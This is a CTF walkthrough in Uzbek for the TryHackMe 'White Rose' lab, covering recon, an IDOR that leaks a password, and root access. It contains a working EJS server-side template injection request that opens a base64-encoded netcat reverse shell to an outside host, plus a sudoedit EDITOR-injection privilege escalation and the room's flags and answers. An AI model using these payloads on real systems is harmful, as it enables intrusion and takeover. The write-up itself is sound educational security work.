# White Rose

Room: https://tryhackme.com/room/whiterose



Ishni boshlashdan oldin:

```
sudo echo "10.10.86.121 cyprusbank.thm" >> /etc/hosts
```



## Aktiv razvetkadan boshlaymiz)

yana o'sha port scanning va yana o'sha RustScan:

```
╭─mete   󰉖 ~
╰─ ❯❯ rustscan -a 10.10.86.121-- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Because guessing isn't hacking.

[~] The config file is expected to be at "/home/mete/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.86.121:22
Open 10.10.86.121:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sV" on ip 10.10.14.210
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 11:56 +05
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 11:56
Scanning 10.10.86.121 [2 ports]
Completed Ping Scan at 11:56, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:56
Completed Parallel DNS resolution of 1 host. at 11:56, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 11:56
Scanning 10.10.86.121 [2 ports]
Discovered open port 22/tcp on 10.10.86.121
Discovered open port 80/tcp on 10.10.86.121
Completed Connect Scan at 11:56, 0.12s elapsed (2 total ports)
Initiating Service scan at 11:56
Scanning 2 services on 10.10.14.210
Completed Service scan at 11:56, 6.28s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.14.210.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.53s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 11:56
Completed NSE at 11:56, 0.49s elapsed
Nmap scan report for 10.10.86.121
Host is up, received syn-ack (0.12s latency).
Scanned at 2025-06-10 11:56:47 +05 for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.66 seconds
```

HTTP(80) va SSH(22) ishlamoqda...



Routinglardan tayinli ma'lumot topa olmadim. Balki... Subdomenlarni qidirish kerakdir.

Buyruq:

```\
ffuf -u http://cyprusbank.thm/ -w /usr/share/payloads/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.cyprusbank.thm" -fs 57
```

Natija:

```
c╭─mete   󰉖 ~
╰─ ❯❯ ffuf -u http://cyprusbank.thm/ -w /usr/share/payloads/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.cyprusbank.thm" -fs 57

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cyprusbank.thm/
 :: Wordlist         : FUZZ: /usr/share/payloads/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.cyprusbank.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 57
________________________________________________

www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 299ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 313ms]
```

Endi bu subdomenlarni /etc/hostsga ro'yxatdan o'tkazamiz.

```
sudo echo "10.10.86.121 www.cyprusbank.thm" >> /etc/hosts
```

```
sudo echo "10.10.86.121 admin.cyprusbank.thm" >> /etc/hosts
```



admin panelning ko'rinishi:

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/whiterose_1.jpg)

## Miyani ishlat!

Bizga TryHackme **credintials** bergan edi unitma deb parol shu bo'lishi mumkin...

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/whiterose_2.jpg)



Kirib oldik... Endi saytni o'rganib chiqamiz.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/whiterose_3.jpg)

Qiziq... URL parametridagi raqamni o'zgartirib ko'rish kerak. Masalan(0,1,2,3,4,5)

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/whiterose_5.jpg)

Oppa! Gayle Bev o'z parolini chatda aytgan ekan-ku. Sinab ko'ramiz.

**name:** Gayle Bev

**password:** p~]P@5!6;rs558:q

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/whiterose_6.jpg)

O'xshadi biz kira oldik va 1-savolga ham javob topdik.

**Savol:** What's Tyrell Wellick's phone number?

**Javob:** 842-029-5701



## Web Hacking

Jaydari tilda aytganda qichimalikni boshladik...

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/whiterose_8.jpg)

**.ejs** bu nima?

.ejs ---  **"Embedded JavaScript"** degan ma’noni anglatadi. Bu — **HTML sahifalarga JavaScript kodlarini qo‘shish** imkonini beruvchi **shablon (template) dvigateli**. U asosan **Node.js** bilan ishlatiladi, ayniqsa **Express.js** frameworkida.

**SSTI** zaifligi bo'lishi mumkin keling sinab ko'ramiz.

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/whiterose_7.jpg)

Hm....

**EJS Server-Side Template Injection (SSTI)**ga nisbatan himoyaga ega...

Izlanib ko'rish kerak. Reverse shell hosil qilish uchun.

Topgan ma'lumotim: https://eslam.io/posts/ejs-server-side-template-injection-rce/

![](https://raw.githubusercontent.com/akhatkulov/Write-Ups/refs/heads/main/TryHackme/Pictures/whiterose_9.jpg)

Hayriyat)

SSTI bo'yicha yaxshigina izlanishlardan so'ng...

So'rov

```
POST /settings HTTP/1.1
Host: admin.cyprusbank.thm
Content-Length: 211
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://admin.cyprusbank.thm
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://admin.cyprusbank.thm/settings
Accept-Encoding: gzip, deflate, br
Cookie: connect.sid=s%3Ai--5w0qKm2LkWSN0YEsDvZI5lYwgg7Xd.7s5hgPqRgn1lEg2O9WMVzN59cLUFjdvKmmeeJxTiP0k
Connection: keep-alive

name=a&passord=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC44LjI0LjEzNSA0NDQ0IC1lIC9iaW4vYmFzaA== | base64 -d | bash"');//
```



TTY hosil qilish:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```



**user.txt**ni qo'lga kiritish:

```
web@cyprusbank:~$ cat /home/web/user.txt
cat user.txt
THM{4lways_upd4te_uR_d3p3nd3nc!3s}
```



## Privilage Escalation

Bizda bor imkoniyat:

```
web@cyprusbank:~$ sudo -l
sudo -l
Matching Defaults entries for web on cyprusbank:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

Usul:

```
export EDITOR="vi -- /root/root.txt"
```

```
sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```



Natija:

```
THM{4nd_uR_p4ck4g3s}
```



Men maqsadga o'tib qo'yaverdim. Istaganlar root.txtni emas sudoers faylini o'zgartirib o'zlarini admin deb e'lon qilib... Tushundizlarku...



# Nafas olar ekanman, men yana davom etaman...